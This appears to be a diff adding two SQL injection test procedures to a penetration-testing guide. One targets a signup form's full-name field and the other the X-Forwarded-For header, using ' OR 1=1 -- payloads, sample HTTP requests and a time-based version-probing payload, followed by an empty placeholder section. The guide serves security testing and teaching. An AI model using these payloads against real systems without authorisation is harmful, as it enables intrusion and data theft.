@@ -237,6 +237,125 @@ By injecting this code into this parameter, it may give us an error in response,
 
 ***
 
+#### SQL Injection in Fullname Parameter
+
+{% stepper %}
+{% step %}
+Navigate to the SignUp page of the target website, typically located at a URL like `/signup` or `/register` Open https://example.com/signup in the browser
+{% endstep %}
+
+{% step %}
+Identify the “Full Name” input field in the SignUp form, which is prone to processing user input directly into database queries Find the text box labeled “Full Name” in the form
+{% endstep %}
+
+{% step %}
+Enter the payload `' OR 1=1 --` into the Full Name field to attempt bypassing the query’s conditions and access unauthorized data Input `John' OR 1=1 --` in the Full Name field
+{% endstep %}
+
+{% step %}
+Click the `“Sign Up”` button to send the payload to the server via a <sub>POST</sub> request
+{% endstep %}
+
+{% step %}
+Look for a generic error (“Invalid input”) or a `400`/`500` status code, indicating the payload was blocked, or unexpected success, suggesting a vulnerability
+{% endstep %}
+
+{% step %}
+If a 400/500 error appears, modify the payload to `' OR 1=2 --` and submit again. Compare responses: if `' OR 1=1 --` allows form submission or data access (account creation without valid input) while `' OR 1=2 --` fails, it confirms SQL injection, as the true condition (`1=1`) altered the query’s logic
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### SQL injection in X-Forwarded-For Header
+
+{% stepper %}
+{% step %}
+Log in to the target site and record requests using Burp Suite
+{% endstep %}
+
+{% step %}
+Identify the X-Forwarded-For header in logged requests
+{% endstep %}
+
+{% step %}
+Routes that set and use the X-Forwarded-For header on sites and usually store its values ​​in the database : `/login` `/signup` `/register` `/logout` `/user/profile` `/profile/update` `/checkout` `/purchase` `/cart/checkout` `/api/*` `/comments` `/comment/post` `/posts` `/posts/create` `/sessions` `/session`\
+`/password/reset`
+{% endstep %}
+
+{% step %}
+Send the request by going to these routes and then setting this header (or if it already exists) and then examine the server response like the following request
+
+```http
+POST /login HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Connection: close
+X-Forwarded-For: 127.0.0.1
+
+username=alice&password=Password123
+```
+{% endstep %}
+
+{% step %}
+Now, using a simple payload like the one below, we will check this header to see if the server is giving us an unusual or strange response
+
+```http
+POST /login HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Connection: close
+X-Forwarded-For: 127.0.0.1' OR 1=1 --
+
+username=alice&password=Password123
+```
+{% endstep %}
+
+{% step %}
+If an error occurs, test a false condition payload like ' OR 1=2 -- and compare
+
+{% hint style="info" %}
+`X-Forwarded-For: 127.0.0.1' OR 1=1 --` succeeds (200 OK), but `' OR 1=2 --` errors (500), proving injectable
+{% endhint %}
+{% endstep %}
+
+{% step %}
+If the attack was successful, we can extract the database version using the following payload
+
+```
+IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)
+```
+{% endstep %}
+{% endstepper %}
+
+***
+
+####
+
+{% stepper %}
+{% step %}
+###
+
+
+{% endstep %}
+
+{% step %}
+###
+
+
+{% endstep %}
+{% endstepper %}
+
+***
+
 ### White Box
 
 ## Cheat Sheet
